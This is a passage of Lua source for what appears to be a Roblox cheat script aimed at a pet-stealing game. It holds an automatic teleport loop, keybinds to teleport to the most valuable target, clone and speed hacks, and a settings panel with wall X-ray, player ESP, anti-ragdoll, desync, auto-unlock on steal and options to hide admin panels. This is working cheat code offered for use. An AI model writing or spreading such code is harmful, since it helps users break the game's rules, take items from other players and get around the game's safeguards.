                    end)
                end
            end
        end)

        local lastTeleportTime = 0

        _autoBackThread = task.spawn(function()
            while Config.AutoBack do
                pcall(function()
                    local stealing = LocalPlayer:GetAttribute("Stealing")
                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild("HumanoidRootPart")
                    if not hrp then return end

                    if stealing == true then
                        local bp = hrp:FindFirstChild("TP_BodyPosition")
                        if bp then bp:Destroy() end
                        return
                    end

                    if _G._autoPickupLocked then
                        local bp = hrp:FindFirstChild("TP_BodyPosition")
                        if bp then bp:Destroy() end
                        return
                    end

                    local hasBP = hrp:FindFirstChild("TP_BodyPosition") ~= nil
                    local targetPos = getAutoBackTarget()
                    local inHitbox = isInsideStealHitbox()
                    local selected = SharedState.SelectedPetData
                    local selectedAnimal = selected and (selected.animalData or selected)
                    local targetPlotOpen = false
                    if selectedAnimal and selectedAnimal.plot and _G._isTargetPlotUnlocked then
                        targetPlotOpen = (_G._isTargetPlotUnlocked(selectedAnimal.plot) == true)
                    end

                    local forceInstantNow = (_forceAutoBackInstantCount or 0) > 0
                    local canAutoBackNow = (not _G.posUnlocked) and (forceInstantNow or (inHitbox and not targetPlotOpen))
                    if not hasBP and not _teleportingBelow and targetPos and canAutoBackNow then
                        local now = os.clock()
                        local delay = forceInstantNow and 0 or 0.05
                        if now - lastTeleportTime >= delay then
                            teleportBelowPet()
                            if forceInstantNow and _forceAutoBackInstantCount > 0 then
                                _forceAutoBackInstantCount = _forceAutoBackInstantCount - 1
                            end
                            lastTeleportTime = now
                        end
                    end
                end)
                task.wait(0.01)
            end
            stopAutoBack()
        end)
    end

    if not Config.AutoBack then Config.AutoBack = false end

    _G.isInsideStealHitbox = isInsideStealHitbox
    _G.startAutoBack = startAutoBack
    _G.stopAutoBack = stopAutoBack
    _G.forceAutoBackInstant = function(times)
        _forceAutoBackInstantCount = math.max(tonumber(times) or 1, 1)
    end

    if Config.AutoBack then startAutoBack() end
end)()

local function executeReset()

    ShowNotification("RESET", "Reiniciando personagem...")

    local plr = LocalPlayer

    if not plr then return end

    task.spawn(function()

        pcall(function()

            local char = plr.Character

            if not char then return end

            local hum = char:FindFirstChildWhichIsA("Humanoid")

            if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end

            char:ClearAllChildren()

            local dummy = Instance.new("Model")

            dummy.Parent = Workspace

            plr.Character = dummy

            plr.Character = char

            dummy:Destroy()

        end)

    end)

end

task.spawn(function()

    local function checkSteal(gui)

        if not Config.AutoKickOnSteal then return end

        local txt = (gui:IsA("TextLabel") or gui:IsA("TextButton")) and gui.Text

        if txt and string.find(txt, "You stole") then

            kickPlayer()

        end

    end

    PlayerGui.DescendantAdded:Connect(function(gui)

        checkSteal(gui)

        if gui:IsA("TextLabel") or gui:IsA("TextButton") then

            gui:GetPropertyChangedSignal("Text"):Connect(function()

                checkSteal(gui)

            end)

        end

    end)

    for _, gui in ipairs(PlayerGui:GetDescendants()) do

        checkSteal(gui)

    end

end)

UserInputService.InputBegan:Connect(function(input, processed)

    if processed then return end

    

    local tpKey = safeKeyCode(Config.TpSettings.TpKey, Enum.KeyCode.T)

    local cloneKey = safeKeyCode(Config.TpSettings.CloneKey, Enum.KeyCode.V)

    local carpetKey = safeKeyCode(Config.TpSettings.CarpetSpeedKey, Enum.KeyCode.Q)

    local resetKey = safeKeyCode(Config.ResetKey, Enum.KeyCode.X)

    local ragdollKey = safeKeyCode(Config.RagdollSelfKey, Enum.KeyCode.R)

    if input.KeyCode == tpKey then

        if _G._activePinConn then _G._activePinConn:Disconnect(); _G._activePinConn = nil end

        if _G._activePlat and _G._activePlat.Parent then _G._activePlat:Destroy(); _G._activePlat = nil end

        -- Se tem pet selecionado manualmente → vai direto pra ele
        -- Se não → tpToBestBrainrot escolhe o melhor automaticamente
        if _G.tpToBestBrainrot then pcall(_G.tpToBestBrainrot) else pcall(runAutoSnipe) end

    end

    if input.KeyCode == cloneKey then

        if _G._activePinConn then _G._activePinConn:Disconnect(); _G._activePinConn = nil end

        if _G._activePlat and _G._activePlat.Parent then _G._activePlat:Destroy(); _G._activePlat = nil end

        instantClone()

    end

    

    if input.KeyCode == carpetKey then

        carpetSpeedEnabled = not carpetSpeedEnabled

        setCarpetSpeed(carpetSpeedEnabled)

        if _carpetStatusLabel then

            _carpetStatusLabel.Text = carpetSpeedEnabled and "ON" or "OFF"

            _carpetStatusLabel.TextColor3 = carpetSpeedEnabled and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(200,60,60)

        end

        ShowNotification("CARPET SPEED", carpetSpeedEnabled and ("ON  |  "..Config.TpSettings.Tool.."  |  160") or "OFF")

    end

    if input.KeyCode == resetKey then

        executeReset()

    end

    

    if input.KeyCode == ragdollKey then

        task.spawn(function()

            if _G.runAdminCommand then

                if _G.runAdminCommand(LocalPlayer, "ragdoll") then

                    ShowNotification("RAGDOLL SELF", "Triggered")

                else

                    ShowNotification("RAGDOLL SELF", "Failed")

                end

            else

                ShowNotification("RAGDOLL SELF", "Function not available")

            end

        end)

    end

end)

local settingsGui = UI.settingsGui

settingsGui = Instance.new("ScreenGui")

settingsGui.Name = "SettingsUI"; settingsGui.ResetOnSpawn = false

settingsGui.Parent = PlayerGui; settingsGui.Enabled = false

local sFrame = Instance.new("Frame")

sFrame.Size = UDim2.new(0, 300, 0, 650)

sFrame.Position = UDim2.new(Config.Positions.Settings.X, 0, Config.Positions.Settings.Y, 0)

sFrame.BackgroundColor3 = Color3.fromRGB(8,8,10); sFrame.BackgroundTransparency = 0.18

sFrame.BorderSizePixel = 0; sFrame.ClipsDescendants = true; sFrame.Parent = settingsGui

Instance.new("UICorner", sFrame).CornerRadius = UDim.new(0, 8)

local sHeader = Instance.new("Frame", sFrame)

sHeader.Size = UDim2.new(1,0,0,40); sHeader.BackgroundTransparency = 1

MakeDraggable(sHeader, sFrame, "Settings") 

local sTitle = Instance.new("TextLabel", sHeader)

sTitle.Size = UDim2.new(1,-20,1,0); sTitle.Position = UDim2.new(0,15,0,0)

sTitle.BackgroundTransparency = 1; sTitle.Text = "SETTINGS"

sTitle.Font = Enum.Font.GothamBlack; sTitle.TextSize = 16

sTitle.TextColor3 = Color3.fromRGB(185,188,215); sTitle.TextXAlignment = Enum.TextXAlignment.Left

local sList = Instance.new("ScrollingFrame", sFrame)

sList.Size = UDim2.new(1,-20,1,-50); sList.Position = UDim2.new(0,10,0,45)

sList.BackgroundTransparency = 1; sList.BorderSizePixel = 0

sList.ScrollBarThickness = 0; sList.ScrollBarImageColor3 = Color3.fromRGB(100,155,255)

local sLayout = Instance.new("UIListLayout", sList)

sLayout.Padding = UDim.new(0,8); sLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function CreateToggleSwitch(parent, initialState, callback)

    local sw = Instance.new("Frame")

    sw.Size = UDim2.new(0,40,0,20); sw.Position = UDim2.new(1,-50,0.5,-10)

    sw.BackgroundColor3 = initialState and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22,22,35)

    Instance.new("UICorner", sw).CornerRadius = UDim.new(1,0); sw.Parent = parent

    local dot = Instance.new("Frame")

    dot.Size = UDim2.new(0,16,0,16)

    dot.Position = initialState and UDim2.new(1,-18,0.5,-8) or UDim2.new(0,2,0.5,-8)

    dot.BackgroundColor3 = Color3.fromRGB(255,255,255)

    Instance.new("UICorner", dot).CornerRadius = UDim.new(1,0); dot.Parent = sw

    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,1,0)

    btn.BackgroundTransparency = 1; btn.Text = ""; btn.Parent = sw

    local isOn = initialState

    local function SetState(s)

        isOn = s

        local tp = isOn and UDim2.new(1,-18,0.5,-8) or UDim2.new(0,2,0.5,-8)

        local tc = isOn and Color3.fromRGB(80, 140, 255) or Color3.fromRGB(22,22,35)

        -- tween removed

        -- tween removed

    end

    btn.MouseButton1Click:Connect(function() callback(not isOn, SetState) end)

    return {Set=SetState, Container=sw}

end

local function CreateRow(text, height)

    local row = Instance.new("Frame")

    row.Size = UDim2.new(1,0,0,height or 34); row.BackgroundColor3 = Color3.fromRGB(14,14,20)

    Instance.new("UICorner", row).CornerRadius = UDim.new(0,6)

    local lbl = Instance.new("TextLabel", row)

    lbl.Size = UDim2.new(0.6,0,1,0); lbl.Position = UDim2.new(0,10,0,0)

    lbl.BackgroundTransparency = 1; lbl.Text = text

    lbl.Font = Enum.Font.GothamMedium; lbl.TextColor3 = Color3.fromRGB(185,188,215)

    lbl.TextSize = 12; lbl.TextXAlignment = Enum.TextXAlignment.Left

    row.Parent = sList; return row

end

local function CreateSectionHeader(text)

    local row = Instance.new("Frame")

    row.Size = UDim2.new(1, 0, 0, 28)

    row.BackgroundTransparency = 1

    row.Parent = sList

    

    local accent = Instance.new("Frame", row)

    accent.Size = UDim2.new(0, 3, 0, 16)

    accent.Position = UDim2.new(0, 4, 0.5, -8)

    accent.BackgroundColor3 = Color3.fromRGB(14,14,20)

    accent.BorderSizePixel = 0

    Instance.new("UICorner", accent).CornerRadius = UDim.new(0, 2)

    

    local lbl = Instance.new("TextLabel", row)

    lbl.Size = UDim2.new(1, -20, 1, 0)

    lbl.Position = UDim2.new(0, 14, 0, 0)

    lbl.BackgroundTransparency = 1

    lbl.Text = text

    lbl.TextColor3 = Color3.fromRGB(80, 140, 255)

    lbl.TextSize = 11

    lbl.Font = Enum.Font.GothamBlack

    lbl.TextXAlignment = Enum.TextXAlignment.Left

    

    local line = Instance.new("Frame", row)

    line.Size = UDim2.new(1, -80, 0, 1)

    line.Position = UDim2.new(0, 75, 0.5, 0)

    line.BackgroundColor3 = Color3.fromRGB(14,14,20)

    line.BackgroundTransparency = 0.7

    line.BorderSizePixel = 0

    

    return row

end

CreateRow("Auto TP on Script Load")

CreateToggleSwitch(sList:FindFirstChildOfClass("Frame"), Config.TpSettings.TpOnLoad, function(ns, set)

    set(ns); Config.TpSettings.TpOnLoad = ns; SaveConfig()

    ShowNotification("AUTO TP ON LOAD", ns and "ENABLED" or "DISABLED")

end)

local rMinGen = CreateRow("Min Gen for Auto TP")

local minGenBox = Instance.new("TextBox", rMinGen)

minGenBox.Size = UDim2.new(0, 100, 0, 24)

minGenBox.Position = UDim2.new(1, -110, 0.5, -12)

minGenBox.BackgroundColor3 = Color3.fromRGB(22,22,35)

minGenBox.Text = tostring(Config.TpSettings.MinGenForTp or "")

minGenBox.Font = Enum.Font.Gotham

minGenBox.TextSize = 11

minGenBox.TextColor3 = Color3.fromRGB(185,188,215)

minGenBox.PlaceholderText = "e.g. 5k, 1m, 1b"

Instance.new("UICorner", minGenBox).CornerRadius = UDim.new(0, 4)

minGenBox.FocusLost:Connect(function()

    local raw = minGenBox.Text:gsub("%s", "")

    Config.TpSettings.MinGenForTp = (raw == "" and "" or raw)

    SaveConfig()

    ShowNotification("MIN GEN FOR TP", Config.TpSettings.MinGenForTp == "" and "No minimum" or "Min: " .. (Config.TpSettings.MinGenForTp or ""))

end)

local rFPS = CreateRow("FPS Boost")

CreateToggleSwitch(rFPS, Config.FPSBoost, function(ns, set)

    set(ns); setFPSBoost(ns)

    ShowNotification("FPS BOOST", ns and "ENABLED" or "DISABLED")

end)

local rLineToBase = CreateRow("Line to Base")

CreateToggleSwitch(rLineToBase, Config.LineToBase, function(ns, set)

    set(ns); Config.LineToBase = ns; SaveConfig()

    if not ns and _G.resetPlotBeam then pcall(_G.resetPlotBeam) end

    ShowNotification("LINE TO BASE", ns and "ENABLED" or "DISABLED")

end)

local rXray = CreateRow("X-Ray")

CreateToggleSwitch(rXray, Config.XrayEnabled, function(ns, set)

    set(ns); Config.XrayEnabled = ns; if ns then enableXray() else disableXray() end; SaveConfig()

    ShowNotification("X-RAY", ns and "ENABLED" or "DISABLED")

end)

CreateSectionHeader("Auto TP")

local toolOptions = {"Flying Carpet", "Cupid's Wings", "Santa's Sleigh", "Witch's Broom"}

local toolSwitches = {}

for _, toolName in ipairs(toolOptions) do

    local r = CreateRow(toolName)

    local ts = CreateToggleSwitch(r, Config.TpSettings.Tool==toolName, function(rs, set)

        if rs then

            Config.TpSettings.Tool=toolName; SaveConfig(); set(true)

            for n, sw in pairs(toolSwitches) do if n~=toolName then sw.Set(false) end end

            ShowNotification("TP TOOL", toolName)

        else

            set(Config.TpSettings.Tool==toolName)

        end

    end)

    toolSwitches[toolName] = ts

end

local rBind = CreateRow("TP Keybind")

local bBind = Instance.new("TextButton", rBind)

bBind.Size=UDim2.new(0,60,0,24); bBind.Position=UDim2.new(1,-70,0.5,-12)

bBind.BackgroundColor3=Color3.fromRGB(22,22,35); bBind.Text=Config.TpSettings.TpKey

bBind.Font=Enum.Font.GothamBold; bBind.TextColor3=Color3.fromRGB(185,188,215); bBind.TextSize=12

Instance.new("UICorner",bBind).CornerRadius=UDim.new(0,4)

bBind.MouseButton1Click:Connect(function()

    bBind.Text="..."; bBind.TextColor3=Color3.fromRGB(80, 140, 255)

    local con; con=UserInputService.InputBegan:Connect(function(inp)

        if inp.UserInputType==Enum.UserInputType.Keyboard then

            Config.TpSettings.TpKey=inp.KeyCode.Name; bBind.Text=inp.KeyCode.Name

            bBind.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

            ShowNotification("TP KEYBIND", inp.KeyCode.Name)

        end

    end)

end)

local rBindClone = CreateRow("Auto Clone Keybind")

local bBindClone = Instance.new("TextButton", rBindClone)

bBindClone.Size=UDim2.new(0,60,0,24); bBindClone.Position=UDim2.new(1,-70,0.5,-12)

bBindClone.BackgroundColor3=Color3.fromRGB(22,22,35); bBindClone.Text=Config.TpSettings.CloneKey

bBindClone.Font=Enum.Font.GothamBold; bBindClone.TextColor3=Color3.fromRGB(185,188,215); bBindClone.TextSize=12

Instance.new("UICorner",bBindClone).CornerRadius=UDim.new(0,4)

bBindClone.MouseButton1Click:Connect(function()

    bBindClone.Text="..."; bBindClone.TextColor3=Color3.fromRGB(80, 140, 255)

    local con; con=UserInputService.InputBegan:Connect(function(inp)

        if inp.UserInputType==Enum.UserInputType.Keyboard then

            Config.TpSettings.CloneKey=inp.KeyCode.Name; bBindClone.Text=inp.KeyCode.Name

            bBindClone.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

            ShowNotification("CLONE KEYBIND", inp.KeyCode.Name)

        end

    end)

end)

CreateSectionHeader("CARPET SPEED")

local rCarpetBind = CreateRow("Carpet Speed Keybind")

local bCarpet = Instance.new("TextButton", rCarpetBind)

bCarpet.Size=UDim2.new(0,60,0,24); bCarpet.Position=UDim2.new(1,-70,0.5,-12)

bCarpet.BackgroundColor3=Color3.fromRGB(22,22,35); bCarpet.Text=Config.TpSettings.CarpetSpeedKey

bCarpet.Font=Enum.Font.GothamBold; bCarpet.TextColor3=Color3.fromRGB(185,188,215); bCarpet.TextSize=12

Instance.new("UICorner",bCarpet).CornerRadius=UDim.new(0,4)

bCarpet.MouseButton1Click:Connect(function()

    bCarpet.Text="..."; bCarpet.TextColor3=Color3.fromRGB(80, 140, 255)

    local con; con=UserInputService.InputBegan:Connect(function(inp)

        if inp.UserInputType==Enum.UserInputType.Keyboard then

            Config.TpSettings.CarpetSpeedKey=inp.KeyCode.Name; bCarpet.Text=inp.KeyCode.Name

            bCarpet.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

            ShowNotification("CARPET SPEED KEYBIND", inp.KeyCode.Name)

        end

    end)

end)

local rRagdollSelf = CreateRow("Ragdoll Self Keybind")

local bRagdollSelf = Instance.new("TextButton", rRagdollSelf)

bRagdollSelf.Size=UDim2.new(0,60,0,24); bRagdollSelf.Position=UDim2.new(1,-70,0.5,-12)

bRagdollSelf.BackgroundColor3=Color3.fromRGB(22,22,35); bRagdollSelf.Text=Config.RagdollSelfKey ~= "" and Config.RagdollSelfKey or "NONE"

bRagdollSelf.Font=Enum.Font.GothamBold; bRagdollSelf.TextColor3=Color3.fromRGB(185,188,215); bRagdollSelf.TextSize=12

Instance.new("UICorner",bRagdollSelf).CornerRadius=UDim.new(0,4)

bRagdollSelf.MouseButton1Click:Connect(function()

    bRagdollSelf.Text="..."; bRagdollSelf.TextColor3=Color3.fromRGB(80, 140, 255)

    local con; con=UserInputService.InputBegan:Connect(function(inp)

        if inp.UserInputType==Enum.UserInputType.Keyboard then

            Config.RagdollSelfKey=inp.KeyCode.Name; bRagdollSelf.Text=inp.KeyCode.Name

            bRagdollSelf.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

            ShowNotification("RAGDOLL SELF KEYBIND", inp.KeyCode.Name)

        end

    end)

end)

_carpetStatusLabel = nil

CreateSectionHeader("MOVEMENT")

local rInfJump = CreateRow("Infinite Jump")

CreateToggleSwitch(rInfJump, infiniteJumpEnabled, function(ns, set)

    set(ns); setInfiniteJump(ns)

    ShowNotification("INFINITE JUMP", ns and "ENABLED" or "DISABLED")

end)

CreateSectionHeader("AUTO UNLOCK")

local rAutoUnlock = CreateRow("Auto Unlock on Steal")

CreateToggleSwitch(rAutoUnlock, Config.AutoUnlockOnSteal, function(ns, set)

    set(ns); Config.AutoUnlockOnSteal = ns; SaveConfig()

    ShowNotification("AUTO UNLOCK", ns and "ENABLED" or "DISABLED")

end)

local rShowUnlockHUD = CreateRow("Show Unlock Buttons HUD")

CreateToggleSwitch(rShowUnlockHUD, Config.ShowUnlockButtonsHUD, function(ns, set)

    set(ns); Config.ShowUnlockButtonsHUD = ns; SaveConfig()

    local hudGui = PlayerGui:FindFirstChild("BullysStatusHUD")

    if hudGui then

        local main = hudGui:FindFirstChild("Main")

        local unlockContainer = main and main:FindFirstChild("UnlockButtonsContainer")

        if main and unlockContainer then

            unlockContainer.Visible = ns

            if ns then

                TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {

                    Size = UDim2.new(0, 500, 0, 100)

                }):Play()

            else

                TweenService:Create(main, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {

                    Size = UDim2.new(0, 500, 0, 50)

                }):Play()

            end

        end

    end

end)

CreateSectionHeader("ANTI-RAGDOLL")

local arV1SetRef, arV2SetRef = {}, {}

local rAr = CreateRow("V1")

CreateToggleSwitch(rAr, Config.AntiRagdoll > 0, function(ns, set)

    arV1SetRef.fn = set

    if ns and Config.AntiRagdollV2 then

        set(false)

        ShowNotification("ANTI-RAGDOLL", "DISABLE V2 FIRST")

        return

    end

    set(ns)

    local mode = ns and 1 or 0

    Config.AntiRagdoll = mode

    if ns then

        Config.AntiRagdollV2 = false

        if arV2SetRef.fn then arV2SetRef.fn(false) end

    end

    SaveConfig()

    startAntiRagdoll(mode)

    if ns then startAntiRagdollV2(false) end

    ShowNotification("ANTI-RAGDOLL V1", ns and "ENABLED" or "DISABLED")

end)

local rArV2 = CreateRow("V2")

CreateToggleSwitch(rArV2, Config.AntiRagdollV2, function(ns, set)

    arV2SetRef.fn = set

    if ns and Config.AntiRagdoll > 0 then

        set(false)

        ShowNotification("ANTI-RAGDOLL", "DISABLE V1 FIRST")

        return

    end

    set(ns)

    Config.AntiRagdollV2 = ns

    if ns then

        Config.AntiRagdoll = 0

        SaveConfig()

        if arV1SetRef.fn then arV1SetRef.fn(false) end

        startAntiRagdoll(0)

        startAntiRagdollV2(true)

    else

        SaveConfig()

        startAntiRagdollV2(false)

    end

    ShowNotification("ANTI-RAGDOLL V2", ns and "ENABLED" or "DISABLED")

end)

CreateSectionHeader("ESP")

local rXray = CreateRow("Base X-Ray")

local xrayToggle = CreateToggleSwitch(rXray, xrayEnabled, function(ns, set)

    set(ns)

    if ns then

        enableXray()

        xrayDescConn = Workspace.DescendantAdded:Connect(function(obj)

            if xrayEnabled and obj:IsA("BasePart") and obj.Anchored and isBaseWall(obj) then

                originalTransparency[obj] = obj.LocalTransparencyModifier

                obj.LocalTransparencyModifier = 0.85

            end

        end)

    else

        disableXray()

    end

    Config.XrayEnabled = ns; SaveConfig()

    ShowNotification("BASE X-RAY", ns and "ENABLED" or "DISABLED")

end)

local playerESPToggleRef = {setFn=nil}

local rPlayerEsp = CreateRow("Player ESP (Hides Names)")

CreateToggleSwitch(rPlayerEsp, Config.PlayerESP, function(ns, set)

    set(ns); Config.PlayerESP = ns; SaveConfig()

    if playerESPToggleRef.setFn then playerESPToggleRef.setFn(ns) end

    ShowNotification("PLAYER ESP", ns and "ENABLED" or "DISABLED")

end)

local espToggleRef = {enabled=true, setFn=nil}

local rEsp = CreateRow("Brainrot ESP")

local espSettingsSwitch = CreateToggleSwitch(rEsp, Config.BrainrotESP, function(ns, set)

    set(ns); Config.BrainrotESP = ns; SaveConfig()

    if espToggleRef.setFn then espToggleRef.setFn(ns) end

    ShowNotification("BRAINROT ESP", ns and "ENABLED" or "DISABLED")

end)

local subspaceMineESPToggleRef = {setFn=nil}

local rSubspaceMineEsp = CreateRow("Subspace Mine Esp")

CreateToggleSwitch(rSubspaceMineEsp, Config.SubspaceMineESP, function(ns, set)

    set(ns); Config.SubspaceMineESP = ns; SaveConfig()

    if subspaceMineESPToggleRef.setFn then subspaceMineESPToggleRef.setFn(ns) end

    ShowNotification("SUBSPACE MINE ESP", ns and "ENABLED" or "DISABLED")

end)

local rIncomingSlot = CreateRow("Incoming Slot Prediction")
CreateToggleSwitch(rIncomingSlot, Config.IncomingSlotESP ~= false, function(ns, set)
    set(ns); Config.IncomingSlotESP = ns; SaveConfig()
    ShowNotification("INCOMING SLOT", ns and "ENABLED" or "DISABLED")
end)

CreateSectionHeader("AUTO STEAL DEFAULTS")

local nearestToggleRef = {}

local highestToggleRef = {}

local priorityToggleRef = {}

local autoTPPriorityToggleRef = {setFn = nil}

local rDefaultNearest = CreateRow("Default To Nearest")

local nearestToggleSwitch = CreateToggleSwitch(rDefaultNearest, Config.DefaultToNearest, function(ns, set)

    if ns then

        Config.DefaultToNearest = true

        Config.DefaultToHighest = false

        Config.DefaultToPriority = false

        set(true)

        if highestToggleRef.setFn then highestToggleRef.setFn(false) end

        if priorityToggleRef.setFn then priorityToggleRef.setFn(false) end

        

        Config.AutoTPPriority = true

        if autoTPPriorityToggleRef and autoTPPriorityToggleRef.setFn then

            autoTPPriorityToggleRef.setFn(true)

        end

    else

        local otherDefaults = Config.DefaultToHighest or Config.DefaultToPriority

        if not otherDefaults then

            set(true)

            ShowNotification("DEFAULT MODE", "At least one default must be enabled")

            return

        end

        Config.DefaultToNearest = false

        set(false)

    end

    SaveConfig()

    ShowNotification("DEFAULT TO NEAREST", ns and "ENABLED" or "DISABLED")

end)

nearestToggleRef.setFn = nearestToggleSwitch.Set

local rDefaultHighest = CreateRow("Default To Highest")

local highestToggleSwitch = CreateToggleSwitch(rDefaultHighest, Config.DefaultToHighest, function(ns, set)

    if ns then

        Config.DefaultToNearest = false

        Config.DefaultToHighest = true

        Config.DefaultToPriority = false

        set(true)

        if nearestToggleRef.setFn then nearestToggleRef.setFn(false) end

        if priorityToggleRef.setFn then priorityToggleRef.setFn(false) end

        

        Config.AutoTPPriority = false

        if autoTPPriorityToggleRef and autoTPPriorityToggleRef.setFn then

            autoTPPriorityToggleRef.setFn(false)

        end

    else

        local otherDefaults = Config.DefaultToNearest or Config.DefaultToPriority

        if not otherDefaults then

            set(true)

            ShowNotification("DEFAULT MODE", "At least one default must be enabled")

            return

        end

        Config.DefaultToHighest = false

        set(false)

    end

    SaveConfig()

    ShowNotification("DEFAULT TO HIGHEST", ns and "ENABLED" or "DISABLED")

end)

highestToggleRef.setFn = highestToggleSwitch.Set

local rDefaultPriority = CreateRow("Default To Priority")

local priorityToggleSwitch = CreateToggleSwitch(rDefaultPriority, Config.DefaultToPriority, function(ns, set)

    if ns then

        Config.DefaultToNearest = false

        Config.DefaultToHighest = false

        Config.DefaultToPriority = true

        set(true)

        if nearestToggleRef.setFn then nearestToggleRef.setFn(false) end

        if highestToggleRef.setFn then highestToggleRef.setFn(false) end

        

        Config.AutoTPPriority = true

        if autoTPPriorityToggleRef and autoTPPriorityToggleRef.setFn then

            autoTPPriorityToggleRef.setFn(true)

        end

    else

        local otherDefaults = Config.DefaultToNearest or Config.DefaultToHighest

        if not otherDefaults then

            set(true)

            ShowNotification("DEFAULT MODE", "At least one default must be enabled")

            return

        end

        Config.DefaultToPriority = false

        set(false)

    end

    SaveConfig()

    ShowNotification("DEFAULT TO PRIORITY", ns and "ENABLED" or "DISABLED")

end)

priorityToggleRef.setFn = priorityToggleSwitch.Set

CreateSectionHeader("AUTOMATION")

local rAutoTpPriority = CreateRow("Auto TP Priority Mode")

local autoTPPriorityToggleSwitch = CreateToggleSwitch(rAutoTpPriority, Config.AutoTPPriority, function(ns, set)

    set(ns); Config.AutoTPPriority = ns; SaveConfig()

    ShowNotification("AUTO TP PRIORITY", ns and "PRIORITY" or "HIGHEST")

end)

autoTPPriorityToggleRef.setFn = autoTPPriorityToggleSwitch.Set

local rAutoKick = CreateRow("Auto-Kick on Steal")

CreateToggleSwitch(rAutoKick, Config.AutoKickOnSteal, function(ns, set)

    set(ns); Config.AutoKickOnSteal = ns; SaveConfig()

    ShowNotification("AUTO-KICK ON STEAL", ns and "ENABLED" or "DISABLED")

end)

CreateSectionHeader("HIDE GUIS")

local rHideAdminPanel = CreateRow("Hide Admin Panel GUI")

CreateToggleSwitch(rHideAdminPanel, Config.HideAdminPanel, function(ns, set)

    set(ns); Config.HideAdminPanel = ns; SaveConfig()

    local adUI = PlayerGui:FindFirstChild("XiAdminPanel")

    if adUI then adUI.Enabled = not ns end

    ShowNotification("HIDE ADMIN PANEL", ns and "ENABLED" or "DISABLED")

end)

local rHideAdminToolsPanel = CreateRow("Hide Admin Tools Panel GUI")

CreateToggleSwitch(rHideAdminToolsPanel, Config.ShowAdminToolsPanel == false, function(ns, set)

    set(ns); Config.ShowAdminToolsPanel = not ns; SaveConfig()

    local toolsGui = PlayerGui:FindFirstChild("XiAdminToolsPanel")

    if toolsGui then toolsGui.Enabled = not ns end

    if SharedState.AdminToolsSetEnabled then pcall(SharedState.AdminToolsSetEnabled, not ns) end

    if ns then

        Config.ClickToAP = false; State.ProximityAPActive = false; SaveConfig()

        if SharedState.UpdateClickToAPButton then SharedState.UpdateClickToAPButton() end

        if SharedState.UpdateProximityAPButton then SharedState.UpdateProximityAPButton() end

    end

    ShowNotification("HIDE ADMIN TOOLS", ns and "ENABLED" or "DISABLED")

end)

local rHideAutoSteal = CreateRow("Hide Auto Steal GUI")

CreateToggleSwitch(rHideAutoSteal, Config.HideAutoSteal, function(ns, set)

    set(ns); Config.HideAutoSteal = ns; SaveConfig()

    local asUI = PlayerGui:FindFirstChild("AutoStealUI")

    if asUI then asUI.Enabled = not ns end

    ShowNotification("HIDE AUTO STEAL", ns and "ENABLED" or "DISABLED")

end)

local rDesyncToggle = CreateRow("Desync")
CreateToggleSwitch(rDesyncToggle, Config.DesyncEnabled ~= false, function(ns, set)
    set(ns); Config.DesyncEnabled = ns; SaveConfig()
    if _G._desyncToggle then _G._desyncToggle(ns) end
    ShowNotification("DESYNC", ns and "ENABLED" or "DISABLED")
end)

local rServerPosViz = CreateRow("Server Pos")
CreateToggleSwitch(rServerPosViz, Config.ServerPosVisualizerEnabled == true, function(ns, set)
    set(ns); Config.ServerPosVisualizerEnabled = ns; SaveConfig()
    if _G._serverPosVizToggle then _G._serverPosVizToggle(ns) end
    ShowNotification("SERVER POS", ns and "ENABLED" or "DISABLED")
end)

CreateSectionHeader("EXTRAS")

local rResetKey = CreateRow("Reset")

local bResetKey = Instance.new("TextButton", rResetKey)

bResetKey.Size=UDim2.new(0,60,0,24); bResetKey.Position=UDim2.new(1,-70,0.5,-12)

bResetKey.BackgroundColor3=Color3.fromRGB(22,22,35); bResetKey.Text=Config.ResetKey

bResetKey.Font=Enum.Font.GothamBold; bResetKey.TextColor3=Color3.fromRGB(185,188,215); bResetKey.TextSize=12

Instance.new("UICorner",bResetKey).CornerRadius=UDim.new(0,4)

bResetKey.MouseButton1Click:Connect(function()

    bResetKey.Text="..."; bResetKey.TextColor3=Color3.fromRGB(80, 140, 255)

    local con; con=UserInputService.InputBegan:Connect(function(inp)

        if inp.UserInputType==Enum.UserInputType.Keyboard then

            Config.ResetKey=inp.KeyCode.Name; bResetKey.Text=inp.KeyCode.Name

            bResetKey.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

            ShowNotification("RESET KEYBIND", inp.KeyCode.Name)

        end

    end)

end)

local rKickKey = CreateRow("Kick")

local bKickKey = Instance.new("TextButton", rKickKey)

bKickKey.Size=UDim2.new(0,60,0,24); bKickKey.Position=UDim2.new(1,-70,0.5,-12)

bKickKey.BackgroundColor3=Color3.fromRGB(22,22,35); bKickKey.Text=Config.KickKey ~= "" and Config.KickKey or "NONE"

bKickKey.Font=Enum.Font.GothamBold; bKickKey.TextColor3=Color3.fromRGB(185,188,215); bKickKey.TextSize=12

Instance.new("UICorner",bKickKey).CornerRadius=UDim.new(0,4)

bKickKey.MouseButton1Click:Connect(function()

    bKickKey.Text="..."; bKickKey.TextColor3=Color3.fromRGB(80, 140, 255)

    local con; con=UserInputService.InputBegan:Connect(function(inp)

        if inp.UserInputType==Enum.UserInputType.Keyboard then

            Config.KickKey=inp.KeyCode.Name; bKickKey.Text=inp.KeyCode.Name

            bKickKey.TextColor3=Color3.fromRGB(185,188,215); SaveConfig(); con:Disconnect()

            ShowNotification("KICK KEYBIND", inp.KeyCode.Name)

        end

    end)

end)

local rCleanErrors = CreateRow("Clean Error GUIs")

CreateToggleSwitch(rCleanErrors, Config.CleanErrorGUIs, function(ns, set)

    set(ns); Config.CleanErrorGUIs = ns; SaveConfig()

    ShowNotification("CLEAN ERROR GUIS", ns and "ENABLED" or "DISABLED")

end)

CreateSectionHeader("ADMIN PANEL")

